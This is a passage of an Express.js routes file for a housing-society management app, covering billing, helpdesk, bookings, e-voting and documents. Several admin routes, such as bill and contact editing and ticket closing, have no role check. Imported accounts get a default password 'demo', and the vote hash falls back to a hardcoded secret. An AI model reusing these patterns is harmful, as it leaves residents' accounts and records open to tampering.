                const occupancyType = (String(row['Owner or Renter'] || row['Occupancy'] || row['occupancyType'] || 'owner')).toLowerCase().includes('rent') ? 'renter' : 'owner';
                const kidsCount = parseInt(row['Kids Count'] || row['kidsCount'] || 0);
                const ownerPhoneNumber = parseInt(row['Owner Contact'] || row['ownerPhoneNumber'] || 0);
                const additionalInfo = row['Additional Info'] || row['additionalInfo'] || '';
                const email = row['Email'] || row['email'] || `${firstName.toLowerCase()}.${lastName.toLowerCase()}@example.com`;
                const password = String(row['Password'] || row['password'] || 'demo');

                // Check if user exists
                const userExists = await User.findOne({ username: email });
                if (!userExists) {
                    await User.register({
                        username: email,
                        firstName,
                        lastName,
                        phoneNumber,
                        fatherName,
                        societyName: req.user.societyName,
                        flatNumber,
                        occupancyType,
                        kidsCount,
                        ownerPhoneNumber: occupancyType === 'renter' ? ownerPhoneNumber : undefined,
                        additionalInfo,
                        role: 'owner',
                        validation: 'approved' // Admin imported users are pre-approved
                    }, password);
                }
            }

            // Cleanup the uploaded temp file
            if (fs.existsSync(req.file.path)) {
                fs.unlinkSync(req.file.path);
            }

            res.redirect("/residents");
        } catch(err) {
            console.error("Excel import error:", err);
            res.status(500).send("Import failed: " + err.message);
        }
    });

    // NOTICEBOARD
    app.get("/noticeboard", checkSocietyApproved, async (req,res) => {
        if(req.isAuthenticated()){
            try {
                const Notice = tenantDb.getTenantModel(req.user.societyName, 'Notice');
                const notices = await Notice.find({});
                const pendingResidents = await user_collection.User.find({
                    societyName: req.user.societyName,
                    validation: 'approved',
                    makePayment: { $gt: 0 }
                });
                
                res.render("noticeboard", {
                    notices: notices,
                    pendingResidents: pendingResidents,
                    isAdmin: req.user.role === 'society_admin' || req.user.role === 'committee_member'
                });
            } catch(e) {
                res.status(500).send("Error");
            }
        } else {
            res.redirect("/login");
        }
    });

    app.get("/notice", checkSocietyApproved, (req,res) => {
        if(req.isAuthenticated() && (req.user.role === 'society_admin' || req.user.role === 'committee_member')){
            res.render("notice");
        } else {
            res.redirect("/login");
        }
    });

    app.post("/notice", checkSocietyApproved, async (req,res) => {
        try {
            const Notice = tenantDb.getTenantModel(req.user.societyName, 'Notice');
            const notice = new Notice({
                date: date.dateString,
                subject: req.body.subject,
                details: req.body.details
            });
            await notice.save();
            
            // Log WhatsApp notification simulation
            logWhatsAppMessage('9999900000', `Noticeboard Update: "${req.body.subject}" published. Read notice: https://quisoft.in/notice`);

            // Write Audit Log
            const AuditLog = tenantDb.getTenantModel(req.user.societyName, 'AuditLog');
            await AuditLog.create({
                userEmail: req.user.username,
                userName: req.user.firstName + ' ' + req.user.lastName,
                role: req.user.role,
                action: 'Publish Notice',
                details: `Published notice: "${req.body.subject}"`
            });

            res.redirect("/noticeboard");
        } catch (e) {
            res.status(500).send("Error");
        }
    });

    // MAINTENANCE BILL
    app.get("/bill", checkSocietyApproved, async (req,res) => {
        if(req.isAuthenticated()){
            try {
                const foundUser = await user_collection.User.findById(req.user.id);
                const foundSociety = await society_collection.Society.findOne({societyName: foundUser.societyName});
                
                const credit = 0;
                const due = 0;
                const totalAmount = foundUser.makePayment || 0;
                
                const foundUsers = await user_collection.User.find({
                    societyName: req.user.societyName,
                    validation: "approved"
                });

                const activeBills = (foundSociety.bills || []).filter(b => b.targetFlat === 'All' || b.targetFlat === foundUser.flatNumber);
                
                res.render("bill", {
                    resident: foundUser,
                    society: foundSociety,
                    totalAmount: totalAmount,
                    pendingDue: due,
                    creditBalance: credit,
                    monthName: date.month,
                    date: date.today,
                    year: date.year,
                    receipt: foundUser.lastPayment,
                    societyResidents: foundUsers,
                    activeBills: activeBills,
                    monthlyTotal: 2020
                });
            } catch(err) {
                console.error(err);
                res.status(500).send("Billing error");
            }
        } else {
            res.redirect("/login");
        }
    });

    app.get("/editBill", checkSocietyApproved, async (req,res) => {
        if(req.isAuthenticated() && req.user.role === 'society_admin'){
            try {
                const foundSociety = await society_collection.Society.findOne({societyName: req.user.societyName});
                const approvedResidents = await user_collection.User.find({
                    societyName: req.user.societyName,
                    validation: "approved",
                    role: { $ne: 'super_admin' }
                });
                res.render("editBill", {
                    maintenanceBill: foundSociety.maintenanceBill,
                    bills: foundSociety.bills || [],
                    residents: approvedResidents
                });
            } catch(err) {
                res.status(500).send("Error");
            }
        } else {
            res.redirect("/login");
        }
    });

    app.post("/editBill", checkSocietyApproved, (req,res) => {
        society_collection.Society.updateOne(
            {societyName: req.user.societyName},
            { $set: {
                maintenanceBill: {
                    societyCharges: req.body.societyCharges,
                    repairsAndMaintenance: req.body.repairsAndMaintenance,
                    sinkingFund: req.body.sinkingFund,
                    waterCharges: req.body.waterCharges,
                    insuranceCharges: req.body.insuranceCharges,
                    parkingCharges: req.body.parkingCharges
                }
            }}
        )
        .then(() => res.redirect("/bill"))
        .catch(err => res.status(500).send("Error"));
    });

    app.post("/bill/add", checkSocietyApproved, upload.single('attachment'), async (req, res) => {
        try {
            if (req.user.role !== 'society_admin' && req.user.role !== 'committee_member') {
                return res.status(403).send("Unauthorized");
            }

            const { title, amount, month, year, targetFlat } = req.body;
            const parsedAmount = parseFloat(amount || 0);

            const billData = {
                title,
                amount: parsedAmount,
                month,
                year: parseInt(year || new Date().getFullYear()),
                targetFlat: targetFlat || 'All',
                attachmentPath: req.file ? '/uploads/' + req.file.filename : undefined,
                status: 'unpaid'
            };

            // Save to Society bills array
            await society_collection.Society.updateOne(
                { societyName: req.user.societyName },
                { $push: { bills: billData } }
            );

            // Increment outstanding dues (makePayment) for target users
            const User = user_collection.User;
            if (targetFlat === 'All') {
                await User.updateMany(
                    { societyName: req.user.societyName, validation: 'approved', role: { $ne: 'super_admin' } },
                    { $inc: { makePayment: parsedAmount } }
                );
            } else {
                await User.updateOne(
                    { societyName: req.user.societyName, flatNumber: targetFlat, validation: 'approved' },
                    { $inc: { makePayment: parsedAmount } }
                );
            }

            // Write Audit Log
            const AuditLog = tenantDb.getTenantModel(req.user.societyName, 'AuditLog');
            await AuditLog.create({
                userEmail: req.user.username,
                userName: req.user.firstName + ' ' + req.user.lastName,
                role: req.user.role,
                action: 'Create Dynamic Bill',
                details: `Added "${title}" bill of amount ₹${parsedAmount} for ${targetFlat}`
            });

            res.redirect("/bill");
        } catch(e) {
            console.error("Add bill error:", e);
            res.status(500).send("Failed to add bill: " + e.message);
        }
    });

    // HELPDESK complaints
    app.get("/helpdesk", checkSocietyApproved, async (req,res) => {
        if(req.isAuthenticated()){
            try {
                const foundSociety = await society_collection.Society.findOne({ societyName: req.user.societyName });
                if(req.user.role === 'society_admin' || req.user.role === 'committee_member') {
                    const foundUsers = await user_collection.User.find({
                        societyName: req.user.societyName, 
                        validation: "approved"
                    });
                    res.render("helpdeskAdmin", { users: foundUsers, society: foundSociety });
                } else {
                    const Complaint = tenantDb.getTenantModel(req.user.societyName, 'Complaint');
                    const list = await Complaint.find({ userId: req.user.id });
                    res.render("helpdesk", { complaints: list, society: foundSociety });
                }
            } catch (err) {
                res.status(500).send("Error");
            }
        } else {
            res.redirect("/login");
        }
    });

    app.post("/admin/helpdesk/settings", checkSocietyApproved, async (req, res) => {
        try {
            if (req.user.role !== 'society_admin') {
                return res.status(403).send("Unauthorized");
            }
            await society_collection.Society.updateOne(
                { societyName: req.user.societyName },
                { $set: {
                    helpdeskName: req.body.helpdeskName,
                    helpdeskPhone: req.body.helpdeskPhone
                }}
            );
            res.redirect("/helpdesk");
        } catch(e) {
            res.status(500).send("Failed to update helpdesk settings");
        }
    });

    app.get("/complaint", checkSocietyApproved, (req,res) => {
        if(req.isAuthenticated() && req.user.validation=='approved'){
            res.render("complaint");
        } else {
            res.redirect("/login");
        }
    });

    app.post("/complaint", checkSocietyApproved, async (req,res) => {
        try {
            const Complaint = tenantDb.getTenantModel(req.user.societyName, 'Complaint');
            const complaint = new Complaint({
                date: date.dateString,
                category: req.body.category,
                type: req.body.type,
                description: req.body.description,
                status: 'open',
                flatNumber: req.user.flatNumber,
                userId: req.user.id,
                userName: req.user.firstName + ' ' + req.user.lastName
            });
            await complaint.save();
            
            // Also save to user array for legacy view backward compatibility
            const user = await user_collection.User.findById(req.user.id);
            user.complaints.push({
                date: date.dateString,
                category: req.body.category,
                type: req.body.type,
                description: req.body.description,
                status: 'open'
            });
            await user.save();

            // WhatsApp notification alert simulator
            logWhatsAppMessage('9999900000', `Support Ticket opened: Resident ${req.user.firstName} (Flat ${req.user.flatNumber}) raised issue: "${req.body.description}". Assigned: Auto-dispatch.`);

            res.redirect("/helpdesk");
        } catch (e) {
            res.status(500).send("Error");
        }
    });

    // CLOSE SUPPORT TICKET
    app.post("/closeTicket", checkSocietyApproved, async (req,res) => {
        try {
            const user_id = Object.keys(req.body.ticket)[0];
            const ticket_index = Object.values(req.body.ticket)[0];
            
            // Find user to get details
            const user = await user_collection.User.findById(user_id);
            
            // Close ticket in central User schema
            const updateStr = 'complaints.' + ticket_index + '.status';
            await user_collection.User.updateOne(
                { _id: user_id },
                { $set: { [updateStr]: 'close' } }
            );

            // Also update the tenant database Complaint record
            const Complaint = tenantDb.getTenantModel(req.user.societyName, 'Complaint');
            const desc = user.complaints[ticket_index].description;
            await Complaint.updateOne(
                { userId: user_id, description: desc },
                { $set: { status: 'close' } }
            );

            // Notify resident
            logWhatsAppMessage(user.phoneNumber, `Ticket Closed: Hello ${user.firstName}, your plumbing/maintenance request has been marked as resolved by facility administrator.`);

            res.redirect("/helpdesk");
        } catch (e) {
            res.status(500).send("Error closing ticket");
        }
    });

    // ADMIN COMPLAINT ASSIGNMENT
    app.post("/admin/complaint/assign", checkSocietyApproved, async (req, res) => {
        try {
            const { userId, ticketIndex, assignedStaff } = req.body;
            const user = await user_collection.User.findById(userId);
            
            // Save assigned staff
            const Complaint = tenantDb.getTenantModel(req.user.societyName, 'Complaint');
            const desc = user.complaints[ticketIndex].description;
            
            await Complaint.updateOne(
                { userId: userId, description: desc },
                { $set: { assignedStaff, status: 'in-progress' } }
            );

            res.redirect("/helpdesk");
        } catch(e) {
            res.status(500).send("Assignment failed");
        }
    });

    // EMERGENCY CONTACTS
    app.get("/contacts", checkSocietyApproved, (req,res) => {
        if(req.isAuthenticated()){
            society_collection.Society.findOne({"societyName": req.user.societyName}, {emergencyContacts: 1})
                .then(foundSociety => {
                    res.render("contacts", {contact: foundSociety.emergencyContacts, isAdmin: req.user.role === 'society_admin'});
                })
                .catch(err => res.status(500).send("Error"));
        } else {
            res.redirect("/login");
        }
    });

    app.get("/editContacts", checkSocietyApproved, (req,res) => {
        if(req.isAuthenticated() && req.user.role === 'society_admin'){
            society_collection.Society.findOne({societyName: req.user.societyName}, {emergencyContacts: 1})
                .then(foundSociety => {
                    res.render("editContacts", {contact: foundSociety.emergencyContacts});
                })
                .catch(err => res.status(500).send("Error"));
        } else {
            res.redirect("/login");
        }
    });

    app.post("/editContacts", checkSocietyApproved, (req,res) => {
        society_collection.Society.updateOne(
            {societyName: req.user.societyName},
            { $set: {
                emergencyContacts: {
                    plumbingService: req.body.plumbingService,
                    medicineShop: req.body.medicineShop,
                    ambulance: req.body.ambulance,
                    doctor: req.body.doctor,
                    fireStation: req.body.fireStation,
                    guard: req.body.guard,
                    policeStation: req.body.policeStation
                }
            }}
        )
        .then(() => res.redirect("/contacts"))
        .catch(err => res.status(500).send("Error"));
    });

    // CCTV SURVEILLANCE
    app.get("/cctv", checkSocietyApproved, (req, res) => {
        if (req.isAuthenticated()) {
            res.render("cctv");
        } else {
            res.redirect("/login");
        }
    });

    // AMENITIES BOOKINGS
    app.get("/amenities", checkSocietyApproved, async (req, res) => {
        if (req.isAuthenticated()) {
            try {
                const Booking = tenantDb.getTenantModel(req.user.societyName, 'Booking');
                const myBookings = await Booking.find({ userId: req.user.id });
                const allBookings = await Booking.find({});
                
                res.render("amenities", { myBookings, allBookings });
            } catch (e) {
                res.status(500).send("Error");
            }
        } else {
            res.redirect("/login");
        }
    });

    app.post("/amenities/book", checkSocietyApproved, async (req, res) => {
        try {
            const Booking = tenantDb.getTenantModel(req.user.societyName, 'Booking');
            const { amenityName, date, slot } = req.body;
            
            // Check slot clashing / double booking
            const conflict = await Booking.findOne({ amenityName, date, slot });
            if (conflict) {
                return res.status(409).send("Slot double-booking collision! This amenity slot has already been reserved by another flat. Please choose a different date or time slot.");
            }
            
            const booking = new Booking({
                amenityName,
                flatNumber: req.user.flatNumber,
                userId: req.user.id,
                userName: req.user.firstName + ' ' + req.user.lastName,
                date,
                slot
            });
            await booking.save();
            
            // WhatsApp log
            logWhatsAppMessage(req.user.phoneNumber, `Slot Reservation Approved: Reserved ${amenityName} for Date: ${date} on Slot: ${slot}`);

            // Write Audit Log
            const AuditLog = tenantDb.getTenantModel(req.user.societyName, 'AuditLog');
            await AuditLog.create({
                userEmail: req.user.username,
                userName: req.user.firstName + ' ' + req.user.lastName,
                role: req.user.role,
                action: 'Reserve Amenity Slot',
                details: `Booked ${amenityName} on ${date} (${slot})`
            });

            res.redirect("/amenities");
        } catch(e) {
            res.status(500).send("Booking failed: " + e.message);
        }
    });

    app.post("/amenities/cancel", checkSocietyApproved, async (req, res) => {
        try {
            const Booking = tenantDb.getTenantModel(req.user.societyName, 'Booking');
            await Booking.deleteOne({ _id: req.body.bookingId, userId: req.user.id });
            res.redirect("/amenities");
        } catch(e) {
            res.status(500).send("Cancellation failed");
        }
    });

    // E-VOTING & POLLS REDIRECT FOR BACKWARD COMPATIBILITY
    app.get("/voting", checkSocietyApproved, (req, res) => {
        res.redirect("/community-hub");
    });

    // COMMUNITY ENGAGEMENT HUB MAIN VIEW
    app.get("/community-hub", checkSocietyApproved, async (req, res) => {
        if (!req.isAuthenticated()) return res.redirect("/login");
        try {
            const societyName = req.user.societyName;
            
            // Get tenant collections
            const Discussion = tenantDb.getTenantModel(societyName, 'Discussion');
            const Poll = tenantDb.getTenantModel(societyName, 'Poll');
            const Survey = tenantDb.getTenantModel(societyName, 'Survey');
            const Suggestion = tenantDb.getTenantModel(societyName, 'Suggestion');
            const Notice = tenantDb.getTenantModel(societyName, 'Notice');

            // Fetch data
            const discussions = await Discussion.find({}).sort({ updatedAt: -1 });
            const polls = await Poll.find({}).sort({ createdAt: -1 });
            const surveys = await Survey.find({}).sort({ createdAt: -1 });
            const suggestions = await Suggestion.find({}).sort({ createdAt: -1 });
            const notices = await Notice.find({}).sort({ createdAt: -1 });

            const totalResidents = await user_collection.User.countDocuments({ societyName, validation: 'approved' });

            // Compute Discussion Analytics
            const mostActiveTopics = [...discussions]
                .sort((a, b) => b.comments.length - a.comments.length)
                .slice(0, 5);

            // Compute resident activity counts
            const residentActivity = {};
            discussions.forEach(d => {
                const creator = d.createdBy.name;
                residentActivity[creator] = (residentActivity[creator] || 0) + 1;
                d.comments.forEach(c => {
                    const commenter = c.createdBy.name;
                    residentActivity[commenter] = (residentActivity[commenter] || 0) + 1;
                    c.replies.forEach(r => {
                        const replier = r.createdBy.name;
                        residentActivity[replier] = (residentActivity[replier] || 0) + 1;
                    });
                });
            });
            const mostActiveResidents = Object.entries(residentActivity)
                .map(([name, count]) => ({ name, count }))
                .sort((a, b) => b.count - a.count)
                .slice(0, 5);

            const trendingDiscussions = discussions
                .filter(d => {
                    const oneDayAgo = new Date(Date.now() - 24 * 60 * 60 * 1000);
                    return d.updatedAt >= oneDayAgo || d.comments.length > 5;
                })
                .slice(0, 5);

            const unresolvedDiscussionsCount = discussions.filter(d => d.status === 'active').length;

            // Compute Voting Analytics
            let totalVoters = 0;
            let totalPossibleVotes = totalResidents;
            let votedPollsCount = 0;

            polls.forEach(p => {
                totalVoters += p.votes.length;
                if (p.votes.length > 0) {
                    votedPollsCount++;
                }
            });
            const participationPercentage = polls.length > 0 ? ((totalVoters / (totalPossibleVotes * polls.length)) * 100).toFixed(1) : 0;

            // Compute Survey Analytics
            let totalResponses = 0;
            let totalRatingSum = 0;
            let totalRatingCount = 0;
            surveys.forEach(s => {
                totalResponses += s.responses.length;
                s.responses.forEach(r => {
                    r.answers.forEach(a => {
                        if (typeof a.answer === 'number') {
                            totalRatingSum += a.answer;
                            totalRatingCount++;
                        }
                    });
                });
            });
            const surveyResponseRate = surveys.length > 0 ? ((totalResponses / (totalPossibleVotes * surveys.length)) * 100).toFixed(1) : 0;
            const satisfactionScore = totalRatingCount > 0 ? ((totalRatingSum / totalRatingCount) * 20).toFixed(1) : 0; // scale rating of 5 to 100%

            // Community Engagement Score
            const totalComments = discussions.reduce((sum, d) => sum + d.comments.length, 0);
            const totalVotes = totalVoters;
            const engagementScore = Math.min(100, Math.round(((totalComments * 2 + totalVotes * 5 + totalResponses * 10) / (totalResidents || 1)) * 5));

            res.render("communityHub", {
                discussions,
                polls,
                surveys,
                suggestions,
                notices,
                mostActiveTopics,
                mostActiveResidents,
                trendingDiscussions,
                unresolvedDiscussionsCount,
                participationPercentage,
                surveyResponseRate,
                satisfactionScore,
                engagementScore,
                totalResidents
            });
        } catch (e) {
            console.error(e);
            res.status(500).send("Error loading Community Engagement Hub: " + e.message);
        }
    });

    // DISCUSSION BOARD ROUTES
    app.post("/community-hub/discussion/create", checkSocietyApproved, async (req, res) => {
        try {
            const Discussion = tenantDb.getTenantModel(req.user.societyName, 'Discussion');
            
            const attachments = [];
            if (req.body.attachmentName) {
                attachments.push({
                    name: req.body.attachmentName,
                    filePath: req.body.attachmentPath || '/uploads/mock.pdf',
                    fileType: (req.body.attachmentName.toLowerCase().endsWith('.pdf')) ? 'pdf' : 'image'
                });
            }

            const discussion = new Discussion({
                title: req.body.title,
                description: req.body.description,
                category: req.body.category || 'General Discussion',
                createdBy: {
                    userId: req.user.id,
                    name: req.user.firstName + ' ' + req.user.lastName,
                    role: req.user.role
                },
                attachments,
                status: 'active'
            });
            await discussion.save();

            global.lastMarketplacePost = global.lastMarketplacePost || {};
            global.lastMarketplacePost[req.user.societyName] = new Date();

            try {
                const otherResidents = await user_collection.User.find({
                    societyName: req.user.societyName,
                    validation: "approved",
                    _id: { $ne: req.user._id }
                });
                for (const resident of otherResidents) {
                    if (resident.phoneNumber) {
                        logWhatsAppMessage(resident.phoneNumber, `Community Hub Alert: New discussion "${req.body.title}" by ${req.user.firstName} in ${req.user.societyName}. Join: https://quisoft.in/community-hub`);
                    }
                }
            } catch(err) {
                console.error("WhatsApp broadcast error:", err);
            }

            logWhatsAppMessage('9999900000', `New Discussion Created: "${req.body.title}" by ${req.user.firstName} in ${req.body.category}. Join discussion: https://quisoft.in/community-hub`);

            res.redirect("/community-hub");
        } catch(e) {
            res.status(500).send("Discussion creation failed");
        }
    });

    app.post("/community-hub/discussion/:id/comment", checkSocietyApproved, async (req, res) => {
        try {
            const Discussion = tenantDb.getTenantModel(req.user.societyName, 'Discussion');
            const discussion = await Discussion.findById(req.params.id);
            discussion.comments.push({
                text: req.body.text,
                createdBy: {
                    userId: req.user.id,
                    name: req.user.firstName + ' ' + req.user.lastName
                },
                likes: [],
                replies: []
            });
            await discussion.save();

            logWhatsAppMessage('9999900000', `New Comment Added on discussion "${discussion.title}": "${req.body.text.substring(0, 30)}..."`);

            res.redirect("/community-hub");
        } catch (e) {
            res.status(500).send("Comment addition failed");
        }
    });

    app.post("/community-hub/discussion/:id/comment/:commentId/reply", checkSocietyApproved, async (req, res) => {
        try {
            const Discussion = tenantDb.getTenantModel(req.user.societyName, 'Discussion');
            const discussion = await Discussion.findById(req.params.id);
            const comment = discussion.comments.id(req.params.commentId);
            comment.replies.push({
                text: req.body.text,
                createdBy: {
                    userId: req.user.id,
                    name: req.user.firstName + ' ' + req.user.lastName
                }
            });
            await discussion.save();
            res.redirect("/community-hub");
        } catch (e) {
            res.status(500).send("Reply addition failed");
        }
    });

    app.post("/community-hub/discussion/:id/comment/:commentId/like", checkSocietyApproved, async (req, res) => {
        try {
            const Discussion = tenantDb.getTenantModel(req.user.societyName, 'Discussion');
            const discussion = await Discussion.findById(req.params.id);
            const comment = discussion.comments.id(req.params.commentId);
            
            const idx = comment.likes.indexOf(req.user.id);
            if (idx === -1) {
                comment.likes.push(req.user.id);
            } else {
                comment.likes.splice(idx, 1);
            }
            await discussion.save();
            res.redirect("/community-hub");
        } catch (e) {
            res.status(500).send("Comment like failed");
        }
    });

    app.post("/community-hub/discussion/:id/follow", checkSocietyApproved, async (req, res) => {
        try {
            const Discussion = tenantDb.getTenantModel(req.user.societyName, 'Discussion');
            const discussion = await Discussion.findById(req.params.id);
            const idx = discussion.followers.indexOf(req.user.id);
            if (idx === -1) {
                discussion.followers.push(req.user.id);
            } else {
                discussion.followers.splice(idx, 1);
            }
            await discussion.save();
            res.redirect("/community-hub");
        } catch (e) {
            res.status(500).send("Follow toggle failed");
        }
    });

    app.post("/community-hub/discussion/:id/convert-to-vote", checkSocietyApproved, async (req, res) => {
        try {
            if (req.user.role !== 'society_admin' && req.user.role !== 'committee_member') {
                return res.status(403).send("Unauthorized");
            }
            const Discussion = tenantDb.getTenantModel(req.user.societyName, 'Discussion');
            const Poll = tenantDb.getTenantModel(req.user.societyName, 'Poll');

            const discussion = await Discussion.findById(req.params.id);
            
            const poll = new Poll({
                question: `Official Vote: ${discussion.title}`,
                description: discussion.description,
                type: 'yes_no',
                options: ['Yes', 'No', 'Abstain'],
                votes: [],
                status: 'open',
                startDate: new Date(),
                endDate: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
                eligibleVoters: 'all',
                isAnonymous: true,
                isPublicResults: true,
                quorumRequirement: 20,
                discussionId: discussion.id
            });
            await poll.save();

            discussion.status = 'converted';
            discussion.linkedPollId = poll.id;
            await discussion.save();

            logWhatsAppMessage('9999900000', `Discussion Converted to Official Vote: "${discussion.title}". Voting Started: https://quisoft.in/community-hub`);

            res.redirect("/community-hub");
        } catch(e) {
            res.status(500).send("Convert to voting failed");
        }
    });

    // E-VOTING SYSTEM ROUTES
    app.post("/community-hub/voting/create", checkSocietyApproved, async (req, res) => {
        try {
            if (req.user.role !== 'society_admin' && req.user.role !== 'committee_member') {
                return res.status(403).send("Unauthorized");
            }
            const Poll = tenantDb.getTenantModel(req.user.societyName, 'Poll');
            const opts = req.body.optionsRaw.split('\n').map(o => o.trim()).filter(Boolean);

            const poll = new Poll({
                question: req.body.question,
                description: req.body.description,
                type: req.body.type || 'single_choice',
                options: opts,
                votes: [],
                status: 'open',
                startDate: req.body.startDate ? new Date(req.body.startDate) : new Date(),
                endDate: req.body.endDate ? new Date(req.body.endDate) : new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
                eligibleVoters: req.body.eligibleVoters || 'all',
                isAnonymous: req.body.isAnonymous === 'true',
                isPublicResults: req.body.isPublicResults === 'true',
                quorumRequirement: Number(req.body.quorumRequirement || 0),
                discussionId: null
            });
            await poll.save();

            logWhatsAppMessage('9999900000', `Voting Started: Resolution "${req.body.question}" is open for vote. Cast vote: https://quisoft.in/community-hub`);

            res.redirect("/community-hub");
        } catch(e) {
            res.status(500).send("Poll creation failed: " + e.message);
        }
    });

    // MOCK OTP REQUEST FOR SECURE VOTING
    app.post("/community-hub/voting/request-otp", checkSocietyApproved, async (req, res) => {
        try {
            const otpCode = Math.floor(100000 + Math.random() * 900000).toString();
            req.session.voteOTP = {
                code: otpCode,
                expires: Date.now() + 5 * 60 * 1000 // 5 minutes
            };
            
            logWhatsAppMessage(req.user.phoneNumber, `Comunify Security OTP: Your secure voting verification code is ${otpCode}. Valid for 5 minutes.`);
            
            res.json({ success: true, message: "OTP sent via simulated SMS/WhatsApp" });
        } catch(e) {
            res.status(500).json({ success: false, error: e.message });
        }
    });

    app.post("/community-hub/voting/cast", checkSocietyApproved, async (req, res) => {
        try {
            const { pollId, option, otp } = req.body;
            
            if (!req.session.voteOTP || req.session.voteOTP.code !== otp || req.session.voteOTP.expires < Date.now()) {
                return res.status(400).send("Verification Failed: Invalid or expired OTP code.");
            }
            
            const Poll = tenantDb.getTenantModel(req.user.societyName, 'Poll');
            const poll = await Poll.findById(pollId);

            const crypto = require('crypto');
            const userIdHash = crypto.createHash('sha256').update(req.user.id + (process.env.SESSION_SECRET || 'danish_society_secret_key')).digest('hex');

            const alreadyVoted = poll.votes.some(v => v.userIdHash === userIdHash);
            if (alreadyVoted) {
                return res.status(403).send("Double voting restricted. You have already cast your ballot.");
            }

            poll.votes.push({
                userIdHash: userIdHash,
                option: option,
                flatNumber: poll.isAnonymous ? 'ANONYMOUS' : req.user.flatNumber
            });

            const votesString = JSON.stringify(poll.votes);
            poll.tamperSignature = crypto.createHash('sha256').update(votesString).digest('hex');
            
            await poll.save();
            req.session.voteOTP = null;

            const AuditLog = tenantDb.getTenantModel(req.user.societyName, 'AuditLog');
            await AuditLog.create({
                userEmail: req.user.username,
                userName: req.user.firstName + ' ' + req.user.lastName,
                role: req.user.role,
                action: 'Cast Secure Vote',
                details: `Cast ballot on resolution "${poll.question}" (Anonymized: ${poll.isAnonymous})`
            });

            res.redirect("/community-hub");
        } catch(e) {
            res.status(500).send("Voting submission failed: " + e.message);
        }
    });

    // SURVEY MODULE ROUTES
    app.post("/community-hub/survey/create", checkSocietyApproved, async (req, res) => {
        try {
            if (req.user.role !== 'society_admin' && req.user.role !== 'committee_member') {
                return res.status(403).send("Unauthorized");
            }
            const Survey = tenantDb.getTenantModel(req.user.societyName, 'Survey');
            
            const questions = [];
            const { qTexts, qTypes, qOptions } = req.body;
            if (Array.isArray(qTexts)) {
                qTexts.forEach((text, i) => {
                    questions.push({
                        text,
                        type: qTypes[i],
                        options: qOptions[i] ? qOptions[i].split(',').map(o => o.trim()).filter(Boolean) : []
                    });
                });
            } else if (qTexts) {
                questions.push({
                    text: qTexts,
                    type: qTypes,
                    options: qOptions ? qOptions.split(',').map(o => o.trim()).filter(Boolean) : []
                });
            }

            const survey = new Survey({
                title: req.body.title,
                description: req.body.description,
                category: req.body.category || 'feedback',
                createdBy: {
                    userId: req.user.id,
                    name: req.user.firstName + ' ' + req.user.lastName
                },
                questions,
                responses: []
            });
            await survey.save();

            logWhatsAppMessage('9999900000', `Survey Published: Feedback survey "${req.body.title}" is now active. Participate: https://quisoft.in/community-hub`);

            res.redirect("/community-hub");
        } catch(e) {
            res.status(500).send("Survey creation failed: " + e.message);
        }
    });

    app.post("/community-hub/survey/:id/submit", checkSocietyApproved, async (req, res) => {
        try {
            const Survey = tenantDb.getTenantModel(req.user.societyName, 'Survey');
            const survey = await Survey.findById(req.params.id);

            const alreadySubmitted = survey.responses.some(r => r.userId === req.user.id);
            if (alreadySubmitted) {
                return res.status(403).send("You have already submitted responses for this survey.");
            }

            const answers = [];
            survey.questions.forEach((q, idx) => {
                let ans = req.body['ans_' + idx];
                if (q.type === 'rating' || q.type === 'scale_rating') {
                    ans = Number(ans || 0);
                }
                answers.push({
                    questionIndex: idx,
                    answer: ans
                });
            });

            survey.responses.push({
                userId: req.user.id,
                answers
            });
            await survey.save();

            res.redirect("/community-hub");
        } catch(e) {
            res.status(500).send("Survey submission failed");
        }
    });

    // SUGGESTIONS ROUTES
    app.post("/community-hub/suggestion/create", checkSocietyApproved, async (req, res) => {
        try {
            const Suggestion = tenantDb.getTenantModel(req.user.societyName, 'Suggestion');
            const sug = new Suggestion({
                title: req.body.title,
                description: req.body.description,
                createdBy: {
                    userId: req.user.id,
                    name: req.user.firstName + ' ' + req.user.lastName,
                    flatNumber: req.user.flatNumber
                },
                upvotes: [],
                downvotes: []
            });
            await sug.save();
            res.redirect("/community-hub");
        } catch(e) {
            res.status(500).send("Suggestion submission failed");
        }
    });

    app.post("/community-hub/suggestion/:id/vote", checkSocietyApproved, async (req, res) => {
        try {
            const Suggestion = tenantDb.getTenantModel(req.user.societyName, 'Suggestion');
            const sug = await Suggestion.findById(req.params.id);
            const { voteType } = req.body;

            const userId = req.user.id;
            
            sug.upvotes = sug.upvotes.filter(id => id !== userId);
            sug.downvotes = sug.downvotes.filter(id => id !== userId);

            if (voteType === 'up') {
                sug.upvotes.push(userId);
            } else if (voteType === 'down') {
                sug.downvotes.push(userId);
            }
            await sug.save();
            res.redirect("/community-hub");
        } catch(e) {
            res.status(500).send("Suggestion voting failed");
        }
    });

    // DOCUMENT VAULT
    app.get("/documents", checkSocietyApproved, async (req, res) => {
        if (req.isAuthenticated()) {
            try {
                const Document = tenantDb.getTenantModel(req.user.societyName, 'Document');
                const documents = await Document.find({});
                
                // Pending NOCs (files named NOC_Request_...)
                const pendingNocs = await Document.find({ fileName: /^NOC_Request_/ });
                
                res.render("documents", { documents, pendingNocs });
            } catch(e) {
                res.status(500).send("Error loading documents");
            }
        } else {
            res.redirect("/login");
        }
    });

    app.post("/documents/upload", checkSocietyApproved, async (req, res) => {
        try {
            if (req.user.role !== 'society_admin' && req.user.role !== 'committee_member') {
                return res.status(403).send("Unauthorized");
            }
            const Document = tenantDb.getTenantModel(req.user.societyName, 'Document');
            const doc = new Document({
                fileName: req.body.fileName,
                fileType: req.body.fileType,
                filePath: '/documents/' + req.body.fileName,
                fileSize: req.body.fileSize || 250,
                uploadedBy: req.user.firstName + ' ' + req.user.lastName
            });
            await doc.save();
            
            // Update society quota
            await society_collection.Society.updateOne(
                { societyName: req.user.societyName },
                { $inc: { storageUsedMb: (req.body.fileSize || 250) / 1024 } }
            );

            // Write Audit Log
            const AuditLog = tenantDb.getTenantModel(req.user.societyName, 'AuditLog');
            await AuditLog.create({
                userEmail: req.user.username,
                userName: req.user.firstName + ' ' + req.user.lastName,
                role: req.user.role,
                action: 'Upload Document',
                details: `Uploaded document ${req.body.fileName} of size ${req.body.fileSize || 250} KB`
            });

            res.redirect("/documents");
        } catch(e) {
            res.status(500).send("Upload failed");
        }
    });

    app.post("/documents/noc/request", checkSocietyApproved, async (req, res) => {
        try {
            const Document = tenantDb.getTenantModel(req.user.societyName, 'Document');
